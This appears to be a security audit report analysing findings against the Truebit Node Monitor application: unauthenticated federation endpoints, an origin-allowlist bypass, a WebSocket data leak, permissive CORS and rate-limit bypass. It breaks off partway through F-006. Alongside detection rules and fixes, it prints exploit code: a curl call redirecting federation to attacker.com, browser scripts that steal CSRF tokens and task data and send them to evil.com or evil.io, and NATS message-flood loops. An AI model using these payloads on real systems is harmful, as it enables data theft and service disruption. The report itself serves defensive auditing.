# Attack Surface Analysis - Truebit Node Monitor

**Analysis Date:** 2025-12-19
**Analyst Role:** Attack Surface Analysis Expert
**Scope:** Security audit findings F-001 through F-009
**Methodology:** Realistic threat modeling with exploitability and impact assessment

---

## Executive Summary

This analysis evaluates 9 security findings across the Truebit Node Monitor application, examining realistic attack scenarios, exploitation difficulty, impact severity, and detection mechanisms. The findings range from critical remote control vulnerabilities to low-risk code quality issues.

**Risk Distribution:**
- **Critical Risk:** 2 findings (F-001, F-002)
- **High Risk:** 1 finding (F-006)
- **Medium Risk:** 3 findings (F-003, F-004, F-005)
- **Low Risk:** 3 findings (F-007, F-008, F-009)

**Key Recommendations:**
1. Immediately implement authentication on federation endpoints (F-001)
2. Fix origin validation bypass (F-002)
3. Implement comprehensive rate limiting (F-006)

---

## Detailed Findings Analysis

### F-001: Federation Endpoints Unauthenticated (High)

**Location:** `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/routes/federation.ts`

#### Attack Scenarios

**Scenario 1: Federation Hijacking**
```
Attacker Action Flow:
1. Discover exposed API at https://victim.com:8090/api/federation/status
2. Call POST /api/federation/settings with malicious NATS server
   {
     "enabled": true,
     "natsServers": ["wss://attacker.com/nats"],
     "shareTasks": true,
     "shareStats": true
   }
3. Monitor receives all task data and publishes to attacker's server
4. Attacker collects execution patterns, timing data, network statistics
```

**Scenario 2: Denial of Service**
```
Attacker Action Flow:
1. Repeatedly call POST /api/federation/reset to clear all federation data
2. Call POST /api/federation/disable to disconnect from legitimate network
3. Legitimate network monitoring and statistics become unavailable
4. Operators cannot diagnose node health or network participation
```

**Scenario 3: Peer Manipulation**
```
Attacker Action Flow:
1. Monitor federation network and identify legitimate peer node IDs
2. Call POST /api/federation/peers/{nodeId}/block for all peers
3. Node becomes isolated from federation network
4. Network statistics become inaccurate, node appears offline
```

#### Exploitability Assessment

**Rating: EASY**

| Factor | Assessment |
|--------|-----------|
| **Access Required** | Network access to port 8090 (typically exposed for dashboard access) |
| **Authentication** | None - endpoints completely unauthenticated |
| **Authorization** | None - no role checks or permission validation |
| **CSRF Protection** | Explicitly bypassed (line 307: `if (req.path.startsWith('/federation/'))`) |
| **Technical Skill** | Basic - Simple HTTP requests with curl/Postman |
| **Detection Difficulty** | Hard to detect without audit logging on federation changes |

**Exploitation Example:**
```bash
# Hijack federation to attacker's server
curl -X PUT https://victim.com:8090/api/federation/settings \
  -H "Content-Type: application/json" \
  -d '{
    "enabled": true,
    "natsServers": ["wss://attacker.com:443"],
    "shareTasks": true,
    "shareStats": true,
    "privacyLevel": "minimal"
  }'

# Response: {"success": true, "message": "Federation settings updated"}
# Node now sends all data to attacker
```

#### Impact Assessment

**Rating: HIGH**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | HIGH | Task statistics, execution patterns, network metrics exposed to attacker |
| **Integrity** | MEDIUM | Settings manipulation, peer blocking, data deletion via /reset |
| **Availability** | MEDIUM | DoS via disable/reset, isolation via peer blocking |
| **Privacy** | HIGH | Even anonymized data patterns reveal node behavior and capacity |
| **Business Impact** | HIGH | Loss of federation trust, potential regulatory compliance issues |

**Affected Endpoints:**
- `POST /api/federation/enable` - Activate federation with attacker's server
- `POST /api/federation/disable` - Disable legitimate federation
- `PUT /api/federation/settings` - Change NATS servers to attacker-controlled
- `POST /api/federation/reset` - Delete all federation data
- `POST /api/federation/peers/:nodeId/block` - Isolate from legitimate peers

#### Attack Prerequisites

1. **Network Access:** Attacker must reach port 8090 (default: 0.0.0.0 binding)
   - Docker Compose exposes port to host network
   - Firewall rules may not restrict internal network access
   - Cloud deployments often have permissive security groups

2. **API Discovery:** Attacker discovers API exists
   - Default port 8090 is easily scannable
   - Frontend JavaScript may reveal API endpoints
   - Common path `/api/federation` follows REST conventions

3. **No Prerequisites for:**
   - Authentication tokens
   - Valid session cookies
   - CSRF tokens (explicitly bypassed)
   - API keys (unless API_KEY env var set, which is optional)

#### Detection Mechanisms

**Current State:** Minimal detection capabilities

**Recommended Detection Signatures:**

```yaml
Detection Rule 1: Unauthorized Federation Changes
  Trigger: POST/PUT/DELETE to /api/federation/* without valid session
  Alert: HIGH severity
  Response: Block IP, notify administrator

Detection Rule 2: Federation Server Changes
  Trigger: natsServers field changes in database
  Alert: CRITICAL severity
  Response: Require manual approval, email notification

Detection Rule 3: Repeated Federation Resets
  Trigger: POST /api/federation/reset > 2 times per hour
  Alert: MEDIUM severity
  Response: Rate limit endpoint, log for investigation

Detection Rule 4: Peer Blocking Patterns
  Trigger: > 5 peers blocked in 10 minutes
  Alert: MEDIUM severity
  Response: Temporary suspension of block functionality
```

**Log Indicators (Currently Missing):**
```javascript
// Recommended audit logging
{
  "timestamp": "2025-12-19T10:30:00Z",
  "event": "FEDERATION_SETTINGS_CHANGED",
  "severity": "CRITICAL",
  "ip": "203.0.113.45",
  "session": "none",
  "old_servers": ["wss://f.tru.watch"],
  "new_servers": ["wss://attacker.com"],
  "authenticated": false
}
```

#### Risk Matrix Position

**Exploitability × Impact = CRITICAL**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
E  EASY    [  ] [  ] [XX] [  ]  <- F-001 positioned here
x  MED     [  ] [  ] [  ] [  ]
p  HARD    [  ] [  ] [  ] [  ]
l
```

---

### F-002: Origin Allowlist Bypass via `startsWith` (High)

**Location:**
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/index.ts` (line 188)
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/websocket/server.ts` (line 62)

#### Attack Scenarios

**Scenario 1: Subdomain Bypass Attack**
```
Configuration:
  ALLOWED_ORIGINS=https://monitor.example.com

Attack:
1. Attacker registers domain: https://monitor.example.com.evil.io
2. Hosts malicious site that makes requests to victim API
3. Origin check passes: "https://monitor.example.com.evil.io".startsWith("https://monitor.example.com") = true
4. Attacker's JavaScript executes authenticated API calls from victim's browser
5. Steals session tokens, CSRF tokens, executes actions as victim
```

**Scenario 2: Path Traversal Bypass**
```
Configuration:
  ALLOWED_ORIGINS=https://example.com/monitor

Attack:
1. Attacker creates site: https://example.com/monitor-malicious
2. Origin validation passes via startsWith check
3. Cross-origin requests succeed from attacker's page
4. Victim's credentials used to access sensitive task data
```

**Scenario 3: Protocol Downgrade Bypass**
```
Configuration:
  ALLOWED_ORIGINS=https://secure.example.com

Attack:
1. Attacker creates HTTP version: https://secure.example.com.http.attacker.com
2. startsWith check passes on string comparison
3. Mixed content warnings may be bypassed
4. Man-in-the-middle attack opportunities
```

#### Exploitability Assessment

**Rating: MEDIUM**

| Factor | Assessment |
|--------|-----------|
| **Access Required** | Ability to register similar domain names |
| **Cost** | $10-50 for domain registration |
| **Technical Skill** | Medium - Requires DNS, hosting, JavaScript knowledge |
| **Victim Interaction** | Required - Victim must visit attacker's site |
| **Success Rate** | High if ALLOWED_ORIGINS is configured (default allows all) |
| **Detection Difficulty** | Hard - Appears as legitimate cross-origin request |

**Exploitation Code:**
```html
<!-- Attacker site: https://monitor.example.com.evil.io -->
<!DOCTYPE html>
<html>
<head><title>Legitimate Looking Page</title></head>
<body>
<script>
// Origin header: https://monitor.example.com.evil.io
// Passes check: origin.startsWith("https://monitor.example.com")

// Steal CSRF token
fetch('https://victim.example.com:8090/api/csrf-token', {
  credentials: 'include'  // Send victim's cookies
})
.then(r => r.json())
.then(data => {
  const csrfToken = data.csrfToken;

  // Exfiltrate sensitive data
  fetch('https://victim.example.com:8090/api/tasks', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(tasks => {
    // Send to attacker's server
    fetch('https://evil.io/collect', {
      method: 'POST',
      body: JSON.stringify({ tasks, csrfToken })
    });
  });
});
</script>
</body>
</html>
```

#### Impact Assessment

**Rating: HIGH**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | HIGH | Full access to API data from victim's browser context |
| **Integrity** | HIGH | Can perform state-changing operations with stolen CSRF tokens |
| **Availability** | LOW | Limited DoS potential via resource exhaustion |
| **Authentication Bypass** | HIGH | Leverages victim's existing session/authentication |
| **Data Exfiltration** | HIGH | Tasks, invoices, logs, federation data accessible |

**Attack Chain:**
1. Victim has active session with monitor dashboard
2. Victim visits attacker's similar domain (phishing, ads, compromised site)
3. Attacker's JavaScript executes with victim's credentials
4. Data exfiltrated, malicious actions performed as victim
5. Audit logs show victim's IP, making attribution difficult

#### Attack Prerequisites

1. **ALLOWED_ORIGINS Configured:**
   - Default is `*` (allows all), making this bypass unnecessary
   - Only vulnerable when administrator configures allowlist
   - Production deployments more likely to configure

2. **Domain Registration:**
   - Attacker registers similar domain
   - Cost: $10-50 per year
   - Time: Minutes to hours (DNS propagation)

3. **Victim Interaction:**
   - Victim must visit attacker's site while logged into monitor
   - Social engineering via phishing email
   - Malicious ads on legitimate sites
   - Compromised third-party website

4. **Browser Environment:**
   - Modern browsers enforce CORS
   - Attacker relies on incorrect server-side validation
   - No client-side exploitation needed

#### Detection Mechanisms

**Current State:** No origin validation logging

**Recommended Detection Signatures:**

```yaml
Detection Rule 1: Suspicious Origin Patterns
  Trigger: Origin contains allowed domain but has additional subdomain/path
  Pattern: .*{allowed_origin}\..*
  Alert: MEDIUM severity
  Example: "https://monitor.example.com.evil.io"

Detection Rule 2: Origin Allowlist Violations
  Trigger: Request from origin similar to allowed but not exact match
  Method: Levenshtein distance < 5 characters
  Alert: MEDIUM severity

Detection Rule 3: Multiple Origin Attempts
  Trigger: Same IP tries >10 different origins in 1 hour
  Alert: HIGH severity
  Response: Temporary IP block

Detection Rule 4: Cross-Origin Data Access
  Trigger: High-value endpoints accessed with Origin header
  Endpoints: /api/tasks/:id/data, /api/audit-log
  Alert: INFO severity (for baseline establishment)
```

**Log Indicators:**
```javascript
{
  "timestamp": "2025-12-19T10:30:00Z",
  "event": "CORS_BYPASS_ATTEMPT",
  "severity": "HIGH",
  "origin": "https://monitor.example.com.evil.io",
  "allowed_origin": "https://monitor.example.com",
  "match_method": "startsWith",
  "ip": "203.0.113.45",
  "endpoint": "/api/tasks",
  "user_agent": "Mozilla/5.0..."
}
```

#### Risk Matrix Position

**Exploitability × Impact = HIGH**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
E  EASY    [  ] [  ] [  ] [  ]
x  MED     [  ] [  ] [XX] [  ]  <- F-002
p  HARD    [  ] [  ] [  ] [  ]
l
```

---

### F-003: WebSocket Task Broadcasts Leak `executionId` (Medium)

**Location:** `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/websocket/server.ts` (line 195)

#### Attack Scenarios

**Scenario 1: Task Correlation Attack**
```
Attack Flow:
1. Attacker connects to WebSocket endpoint (no auth required if WS_AUTH_REQUIRED=false)
2. Receives real-time task broadcasts with executionId field
3. Correlates executionId with blockchain transactions or external logs
4. Builds timeline of node's task processing activity
5. Identifies high-value computation patterns or timing
```

**Scenario 2: Privacy Correlation**
```
Attack Flow:
1. Attacker monitors WebSocket for executionId values
2. Collects executionIds: ["abc-123", "def-456", "ghi-789"]
3. Cross-references with publicly visible blockchain data
4. Maps executionIds to specific wallet addresses or contracts
5. De-anonymizes node operator despite privacy guarantees
```

**Scenario 3: Federation Privacy Bypass**
```
Context:
  - Federation uses anonymization (hashed executionIds)
  - WebSocket broadcasts raw executionIds
  - Attacker connects to both WebSocket and federation

Attack Flow:
1. Receive federation message with taskIdHash: "7a8b9c..."
2. Receive WebSocket message with executionId: "task-abc-123"
3. Hash executionId locally and match to taskIdHash
4. De-anonymize all federation messages from this node
5. Privacy guarantees completely bypassed
```

#### Exploitability Assessment

**Rating: EASY**

| Factor | Assessment |
|--------|-----------|
| **Access Required** | WebSocket connection to port 8090 |
| **Authentication** | None (WS_AUTH_REQUIRED defaults to false) |
| **Technical Skill** | Low - Basic WebSocket client knowledge |
| **Tools** | Browser console, wscat, any WebSocket library |
| **Detection Difficulty** | Very Hard - Indistinguishable from legitimate frontend |
| **Persistence** | Continuous real-time monitoring possible |

**Exploitation Code:**
```javascript
// Connect to victim's WebSocket
const ws = new WebSocket('ws://victim.example.com:8090');

const executionIds = new Set();

ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);

  if (msg.type === 'task' && msg.data.executionId) {
    executionIds.add(msg.data.executionId);

    console.log(`[LEAKED] executionId: ${msg.data.executionId}`);
    console.log(`[TOTAL] Collected ${executionIds.size} unique execution IDs`);

    // Exfiltrate to attacker's server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({
        executionId: msg.data.executionId,
        timestamp: msg.timestamp,
        nodeAddress: msg.data.addressHash // Also leaked
      })
    });
  }
};

// Stay connected indefinitely
ws.onerror = () => setTimeout(() => ws.connect(), 5000);
```

#### Impact Assessment

**Rating: MEDIUM**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | MEDIUM | executionId values leaked, privacy metadata exposed |
| **Privacy** | MEDIUM | Can correlate tasks across systems, de-anonymize federation data |
| **Compliance** | MEDIUM | Violates stated privacy guarantees in documentation |
| **Trust** | MEDIUM | Users expect execution IDs to be private |
| **Data Aggregation** | MEDIUM | Long-term monitoring reveals processing patterns |

**Sensitive Information Leaked:**
```javascript
// Current WebSocket broadcast (VULNERABLE)
{
  "type": "task",
  "data": {
    "executionId": "550e8400-e29b-41d4-a716-446655440000",  // LEAKED
    "event": "started",
    "addressHash": "7a3f9c2e...",  // Partial leak
    "timestamp": "2025-12-19T10:30:00Z"
  }
}

// Expected (after sanitization)
{
  "type": "task",
  "data": {
    // executionId removed entirely
    "event": "started",
    "addressHash": "7a3f9c2e...",
    "timestamp": "2025-12-19T10:30:00Z"
  }
}
```

#### Attack Prerequisites

1. **Network Access to Port 8090:**
   - Default Docker Compose exposes to 0.0.0.0:8090
   - No VPN or network segmentation required
   - Accessible from anywhere if firewall permits

2. **No Authentication:**
   - WS_AUTH_REQUIRED defaults to false
   - Even if enabled, frontend doesn't implement auth handshake (F-004)
   - Origin checks bypassable (F-002)

3. **Minimal Technical Skill:**
   - Browser console can open WebSocket connections
   - No exploitation tools needed
   - Simple JavaScript knowledge sufficient

#### Detection Mechanisms

**Current State:** No WebSocket message logging or anomaly detection

**Recommended Detection Signatures:**

```yaml
Detection Rule 1: Long-Duration WebSocket Connections
  Trigger: WebSocket connection active > 24 hours
  Alert: LOW severity (may be legitimate dashboard)
  Response: Log for pattern analysis

Detection Rule 2: Multiple Concurrent Connections from Single IP
  Trigger: > 3 WebSocket connections from same IP
  Alert: MEDIUM severity
  Response: Rate limit, investigate

Detection Rule 3: WebSocket Without HTTP Session
  Trigger: WS connection without prior HTTP session establishment
  Alert: MEDIUM severity
  Indicator: Automated scraping, not browser-based

Detection Rule 4: Rapid Message Consumption
  Trigger: Client never sends messages, only receives (one-way)
  Alert: LOW severity
  Pattern: Data collection bot

Detection Rule 5: Origin Header Anomalies
  Trigger: WebSocket Origin differs from expected domains
  Alert: MEDIUM severity
  Response: Compare with ALLOWED_ORIGINS
```

**Monitoring Metrics:**
```javascript
{
  "metric": "websocket_connections",
  "dimensions": {
    "ip": "203.0.113.45",
    "origin": "https://unknown.com",
    "authenticated": false,
    "duration_seconds": 86400,  // 24 hours
    "messages_received": 0,
    "messages_sent": 5000,  // Only receiving
    "connection_pattern": "suspicious"
  }
}
```

#### Risk Matrix Position

**Exploitability × Impact = MEDIUM**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
E  EASY    [  ] [XX] [  ] [  ]  <- F-003
x  MED     [  ] [  ] [  ] [  ]
p  HARD    [  ] [  ] [  ] [  ]
l
```

---

### F-004: WebSocket Authentication Unusable (Medium)

**Location:**
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/websocket/server.ts` (line 72-95)
- `/Users/tk/projects/truebit-node-monitor/monitor/frontend/src/services/websocket.ts` (no auth implementation)

#### Attack Scenarios

**Scenario 1: Broken Security Posture**
```
Operator Attempt:
1. Operator sets WS_AUTH_REQUIRED=true for security
2. Frontend connects but never sends auth message
3. Auth timeout triggers after 30 seconds (line 91-92)
4. Connection closed with code 4001
5. Dashboard completely broken - no real-time updates
6. Operator forced to disable auth: WS_AUTH_REQUIRED=false
7. System now completely unauthenticated

Result: Security feature becomes availability feature toggle
```

**Scenario 2: False Sense of Security**
```
Deployment:
  WS_AUTH_REQUIRED=true
  WS_AUTH_TOKEN=secret-token-12345

Reality:
1. Admin believes WebSocket is protected
2. Frontend never authenticates (code missing)
3. No connections work, including legitimate ones
4. Admin disables auth to "fix" the problem
5. Documentation doesn't explain this limitation
6. Attack surface unknowingly expanded
```

**Scenario 3: Development vs Production Mismatch**
```
Development:
  WS_AUTH_REQUIRED=false (default)
  Everything works fine

Production:
1. Security team requires WS_AUTH_REQUIRED=true
2. Deployment succeeds
3. Dashboard loads but real-time features fail silently
4. Tasks show as stuck, stats don't update
5. Emergency rollback to disabled auth
6. Production runs without WebSocket protection
```

#### Exploitability Assessment

**Rating: N/A (Defensive Vulnerability)**

This is not directly exploitable but creates exploitability of other issues:

| Factor | Assessment |
|--------|-----------|
| **Direct Exploitation** | None - This is a broken security control |
| **Indirect Impact** | Forces auth to be disabled, enabling F-003 |
| **Configuration Risk** | HIGH - Operators likely run with WS_AUTH_REQUIRED=false |
| **Documentation** | Missing - .env.example shows flag but no frontend implementation |
| **Testing Coverage** | None - Broken functionality likely untested |

**Broken Flow:**
```javascript
// Server expects (websocket/server.ts:104-126)
ws.on('message', (message) => {
  const data = JSON.parse(message);
  if (data.type === 'auth') {
    if (data.token === WS_AUTH_TOKEN) {
      clientInfo.authenticated = true;  // Success
    } else {
      ws.close(4003, 'Invalid token');  // Failure
    }
  }
});

// Timeout enforcement (websocket/server.ts:88-94)
if (this.authRequired) {
  setTimeout(() => {
    if (!clientInfo.authenticated) {
      ws.close(4001, 'Authentication timeout');  // Disconnects after 30s
    }
  }, AUTH_TIMEOUT_MS);
}

// Frontend implementation (services/websocket.ts:30-48)
this.ws = new WebSocket(wsUrl);
this.ws.onopen = () => {
  console.log('WebSocket connected');
  this.connected = true;
  // MISSING: Should send auth message here
  // this.ws.send(JSON.stringify({ type: 'auth', token: AUTH_TOKEN }));
};
// Result: Connection closes after 30 seconds if auth required
```

#### Impact Assessment

**Rating: MEDIUM**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Availability** | HIGH | Enabling auth breaks all WebSocket functionality |
| **Security Posture** | HIGH | Forces operators to disable authentication |
| **Operational Risk** | MEDIUM | Production incidents from configuration changes |
| **Attack Surface** | MEDIUM | Indirectly exposes F-003 by preventing auth use |
| **Technical Debt** | MEDIUM | Incomplete feature increases maintenance burden |

**Consequences:**
1. **Production Outages:** Enabling auth breaks dashboard
2. **Security Theater:** Auth flag exists but cannot be used
3. **Configuration Drift:** Dev/prod environments inconsistent
4. **Documentation Gap:** No warning about broken feature
5. **Attack Enablement:** Cannot protect against F-003 exploitation

#### Attack Prerequisites

This is not an attack but a broken security control. However, it creates prerequisites for other attacks:

**Enables F-003 (executionId leak):**
- Operators cannot enable WS authentication
- All WebSocket connections remain unauthenticated
- executionId leak cannot be mitigated by authentication

**Enables Future Attacks:**
- Any future WebSocket-based attack cannot be prevented by auth
- Network-level controls become only defense

#### Detection Mechanisms

**Current State:** No logging of auth failures or configuration issues

**Recommended Monitoring:**

```yaml
Monitoring Rule 1: WebSocket Auth Configuration Mismatch
  Trigger: WS_AUTH_REQUIRED=true but auth failures detected
  Alert: HIGH severity
  Response: Automated documentation link, suggest disabling

Monitoring Rule 2: Auth Timeout Patterns
  Trigger: Multiple 4001 close codes (auth timeout)
  Alert: MEDIUM severity
  Pattern: Indicates auth requirement without frontend support

Monitoring Rule 3: Connection Success Rate
  Trigger: WebSocket connection success rate < 50%
  Alert: HIGH severity
  Response: Check auth configuration

Monitoring Rule 4: Frontend Error Logs
  Trigger: "WebSocket disconnected" within 30s of connection
  Alert: MEDIUM severity
  Pattern: Likely auth timeout
```

**Health Check:**
```javascript
{
  "websocket": {
    "auth_required": true,
    "auth_supported_by_frontend": false,  // MISMATCH!
    "status": "degraded",
    "issue": "Auth enabled but frontend lacks implementation",
    "recommendation": "Set WS_AUTH_REQUIRED=false or implement frontend auth"
  }
}
```

#### Risk Matrix Position

**Impact = MEDIUM (Defensive Failure, Not Direct Attack)**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
  Defensive [  ] [XX] [  ] [  ]  <- F-004
  Control
  Failure
```

---

### F-005: CORS Allows All Origins by Default (Medium)

**Location:** `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/index.ts` (lines 181-201)

#### Attack Scenarios

**Scenario 1: Cross-Site Request Forgery (CSRF)**
```
Attack Flow:
1. Victim has active session with monitor dashboard
2. Victim visits attacker's website: https://evil.com
3. Attacker's JavaScript makes requests to monitor API
4. CORS allows all origins, so browser permits requests
5. Credentials automatically included (credentials: true)
6. Attacker reads task data, modifies settings, exfiltrates information

Attacker Code:
fetch('https://victim.com:8090/api/tasks', {
  credentials: 'include'  // Send cookies
})
.then(r => r.json())
.then(tasks => {
  // Exfiltrate task data
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(tasks)
  });
});
```

**Scenario 2: Session Token Theft**
```
Context:
  - Challenge-response auth creates session tokens
  - Session tokens stored in headers (X-Session-Token)
  - CORS allows reading response headers

Attack Flow:
1. Victim authenticates to monitor
2. Victim visits attacker site while session active
3. Attacker site makes authenticated request:
   fetch('https://victim.com:8090/api/tasks', {
     credentials: 'include',
     headers: { 'X-Session-Token': 'victim-token' }
   })
4. Response includes sensitive data
5. CORS policy allows attacker to read response
6. Data exfiltrated to attacker's server
```

**Scenario 3: CSRF Protection Bypass**
```
Context:
  - CSRF tokens required for state-changing operations
  - But CSRF can be bypassed with broad CORS

Attack Flow:
1. Attacker fetches CSRF token:
   GET https://victim.com:8090/api/csrf-token
2. CORS allows reading response (credentials: include)
3. Attacker obtains valid CSRF token for victim's session
4. Makes state-changing request with stolen CSRF token:
   POST https://victim.com:8090/api/some-endpoint
   Headers: { 'X-CSRF-Token': stolen_token }
5. Request succeeds because CSRF token valid
6. CSRF protection effectively bypassed
```

#### Exploitability Assessment

**Rating: MEDIUM**

| Factor | Assessment |
|--------|-----------|
| **Default Config** | Vulnerable (ALLOWED_ORIGINS not set = allow all) |
| **Victim Interaction** | Required - Victim must visit attacker site |
| **Authentication** | Leverages victim's existing session |
| **Technical Skill** | Low - Basic JavaScript/HTML knowledge |
| **Success Rate** | High if victim is authenticated |
| **Detection Difficulty** | Medium - Legitimate origins hard to distinguish |

**Exploitation Code:**
```html
<!-- Attacker's malicious page: https://evil.com/steal.html -->
<!DOCTYPE html>
<html>
<head><title>Free Crypto Tools</title></head>
<body>
<h1>Calculating...</h1>
<script>
// Victim's monitor endpoint
const TARGET = 'https://victim.monitor.com:8090';

// Step 1: Get CSRF token
fetch(`${TARGET}/api/csrf-token`, {
  credentials: 'include'  // Use victim's cookies
})
.then(r => r.json())
.then(data => {
  const csrf = data.csrfToken;

  // Step 2: Exfiltrate all task data
  fetch(`${TARGET}/api/tasks?limit=1000`, {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(tasks => {
    // Step 3: Get sensitive task inputs/outputs
    Promise.all(
      tasks.tasks.map(task =>
        fetch(`${TARGET}/api/tasks/${task.execution_id}/data`, {
          credentials: 'include'
        }).then(r => r.json())
      )
    )
    .then(sensitiveData => {
      // Step 4: Send everything to attacker
      fetch('https://evil.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify({
          tasks,
          sensitiveData,
          csrfToken: csrf,
          timestamp: new Date()
        })
      });
    });
  });
});
</script>
</body>
</html>
```

#### Impact Assessment

**Rating: MEDIUM**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | MEDIUM | Task data, invoices, logs accessible via CORS |
| **Integrity** | MEDIUM | State-changing operations possible with CSRF bypass |
| **Authentication Bypass** | MEDIUM | Leverages victim's session without their knowledge |
| **CSRF Protection** | MEDIUM | CSRF tokens can be obtained cross-origin |
| **Privacy** | MEDIUM | Even anonymized data can be correlated |

**Data at Risk:**
```javascript
// Accessible via CORS with credentials
GET /api/tasks         // All task metadata
GET /api/tasks/:id/data  // Sensitive input/output (if session valid)
GET /api/invoices      // Payment and gas usage data
GET /api/logs          // Execution logs (if session valid)
GET /api/federation/*  // Federation settings and stats
GET /api/status        // Node status and Docker info
GET /api/csrf-token    // Valid CSRF token for session
```

**Attack Chain:**
1. Victim browses web while logged into monitor
2. Visits compromised/malicious site
3. Site's JavaScript executes in victim's browser
4. Makes cross-origin requests to monitor API
5. CORS allows requests because origin check passes (default: allow all)
6. Victim's session/cookies automatically included
7. Sensitive data exfiltrated to attacker
8. Attacker has full task history, execution patterns, node info

#### Attack Prerequisites

1. **Default Configuration:**
   - ALLOWED_ORIGINS environment variable not set
   - Default behavior: allow all origins
   - Most deployments likely use default (no explicit config in examples)

2. **Victim Prerequisites:**
   - Active session with monitor (logged in)
   - Session token or cookies valid
   - Visits attacker's site while session active

3. **Attacker Prerequisites:**
   - Host malicious page (free hosting, compromised site, ads)
   - Know monitor's URL/IP (scanning, reconnaissance)
   - Basic JavaScript knowledge

4. **Browser Environment:**
   - Modern browser with CORS support
   - Cookies/credentials enabled (default)
   - No browser extensions blocking cross-origin requests

#### Detection Mechanisms

**Current State:** Warning logged but not enforced (`[SECURITY] CORS blocked origin` - line 191)

**Recommended Detection Signatures:**

```yaml
Detection Rule 1: Cross-Origin Requests from Unexpected Domains
  Trigger: Request with Origin header not in allowlist
  Alert: MEDIUM severity
  Log: Origin, IP, endpoint, session
  Response: Block request, log for analysis

Detection Rule 2: High-Volume Cross-Origin Requests
  Trigger: > 50 cross-origin requests per minute from single origin
  Alert: HIGH severity
  Pattern: Automated scraping or exfiltration
  Response: Rate limit, temporary block

Detection Rule 3: Sensitive Endpoint Access Cross-Origin
  Trigger: Cross-origin request to /api/tasks/:id/data, /api/audit-log
  Alert: HIGH severity
  Response: Require same-origin for sensitive endpoints

Detection Rule 4: CSRF Token Requests from External Origins
  Trigger: GET /api/csrf-token with Origin header from unknown domain
  Alert: MEDIUM severity
  Pattern: Potential CSRF attack preparation

Detection Rule 5: Session + Cross-Origin Combination
  Trigger: Request with valid session token AND external Origin
  Alert: HIGH severity
  Pattern: Authenticated cross-origin attack
```

**Enhanced Logging:**
```javascript
{
  "timestamp": "2025-12-19T10:30:00Z",
  "event": "CROSS_ORIGIN_REQUEST",
  "severity": "MEDIUM",
  "origin": "https://evil.com",
  "endpoint": "/api/tasks",
  "method": "GET",
  "session_valid": true,
  "ip": "203.0.113.45",
  "user_agent": "Mozilla/5.0...",
  "allowed": true,  // Default config allows all
  "should_block": true,  // Recommendation based on pattern
  "risk_score": 7.5
}
```

**Response Actions:**
```javascript
// Recommended defense-in-depth
if (isProductionEnvironment && !ALLOWED_ORIGINS.length) {
  console.error('[SECURITY] CRITICAL: ALLOWED_ORIGINS not configured');
  console.error('[SECURITY] Defaulting to same-origin only for safety');
  // Enforce same-origin instead of allow-all
  callback(new Error('CORS not configured - same-origin only'));
}
```

#### Risk Matrix Position

**Exploitability × Impact = MEDIUM**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
E  EASY    [  ] [  ] [  ] [  ]
x  MED     [  ] [XX] [  ] [  ]  <- F-005
p  HARD    [  ] [  ] [  ] [  ]
l
```

---

### F-006: Aggregator Rate Limiting Bypass (Medium)

**Location:** `/Users/tk/projects/truebit-node-monitor/aggregator/src/index.ts` (lines 138-158)

#### Attack Scenarios

**Scenario 1: Anonymous Message Flood**
```
Attack Code:
// Attacker connects to NATS without nodeId
const nc = await connect({
  servers: ['wss://f.tru.watch']
});

// Flood without nodeId field
for (let i = 0; i < 100000; i++) {
  nc.publish('truebit.task.received', JSON.stringify({
    // No nodeId field - bypasses rate limiting!
    data: { fake: 'task data'.repeat(1000) },  // Large payload
    timestamp: new Date().toISOString()
  }));
}

Result:
- Rate limiter checks: if (!nodeId) return false; (line 139)
- All 100,000 messages bypass rate limiting
- Aggregator processes every message
- Database insertion overhead × 100,000
- Memory exhaustion from nodeMessageCounts map growth
- Legitimate nodes experience degraded service
```

**Scenario 2: Database Amplification Attack**
```
Attack Flow:
1. Attacker publishes messages without nodeId
2. Each message triggers database INSERT operation
3. No rate limiting applied (nodeId missing)
4. Database size grows rapidly
   - 1 million messages × 1KB average = 1GB+
   - Disk space exhaustion
   - Query performance degradation
5. Cleanup only runs every 24 hours (line 128)
6. Attack sustains for hours before cleanup

Impact:
- Aggregator database fills disk
- INSERT operations slow down
- Legitimate statistics aggregation delays
- Federation network statistics become unreliable
```

**Scenario 3: Memory Exhaustion via Map Overflow**
```
Attack Pattern:
// Send messages with rotating fake nodeIds
for (let i = 0; i < 1000000; i++) {
  nc.publish('truebit.task.received', JSON.stringify({
    nodeId: `fake-node-${i}`,  // Unique nodeId each time
    data: { task: 'data' },
    timestamp: new Date().toISOString()
  }));
}

Result:
- nodeMessageCounts Map grows to 1,000,000 entries
- Each entry: { count: number, windowStart: number }
- Memory usage: ~100MB+ for Map alone
- Cleanup only removes entries idle for 10× rate limit window (line 164)
- Map never shrinks fast enough
- Aggregator OOM crash or swap thrashing
```

**Scenario 4: Statistics Pollution**
```
Attack Goal: Corrupt network-wide statistics

Attack Flow:
1. Send fake task_received messages (no rate limit)
2. Aggregator stores fake statistics
3. Network-wide stats show inflated task counts
4. Monitors display incorrect "network activity"
5. Operators make decisions based on false data
6. Market manipulation if stats are publicly visible

Fake Data:
{
  "nodeId": null,  // Bypasses rate limit
  "data": {
    "taskType": "wasm",
    "elapsed_ms": 5000,
    "gas_used": 1000000,
    "steps_computed": 50000
  }
}

Impact:
- Total network task count artificially inflated
- Average execution time skewed
- Gas usage statistics corrupted
- Cache hit rate calculation poisoned
```

#### Exploitability Assessment

**Rating: MEDIUM**

